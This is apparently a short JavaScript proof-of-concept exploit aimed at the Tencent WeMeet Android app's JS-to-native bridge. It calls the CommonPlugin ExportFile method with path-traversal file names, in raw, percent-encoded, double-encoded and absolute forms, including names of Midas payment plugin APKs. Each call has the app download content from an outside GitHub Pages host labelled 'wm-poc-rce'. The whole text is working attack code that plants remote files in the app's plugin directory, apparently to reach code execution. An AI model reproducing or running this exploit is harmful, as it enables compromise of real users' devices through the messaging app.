(function(){
  var names=['../p111_raw.bin','%2e%2e%2fp111_pct.bin','%252e%252e%252fp111_double.bin','..%2fp111_mixed.bin','/data/user/0/com.tencent.wemeet.app/app_midasplugins/p111_abs.apk','MidasSign.ini','MidasPay_p111.apk'];
  window.__p111=function(r){try{document.title='P111CB:'+r}catch(e){}};
  names.forEach(function(name,i){setTimeout(function(){
    document.title='P111RUN:'+i;
    JSCallJavaMgr.JSCallNative(JSON.stringify({callback:'window.__p111',module:'CommonPlugin',method:'ExportFile',callId:'P111-'+i,param:{fileName:name,contentType:'application/octet-stream',url:'https://gitwhs.github.io/wm-poc-rce/p110marker.bin?i='+i,headers:{},callback:''}}));
  },i*550)});
})();
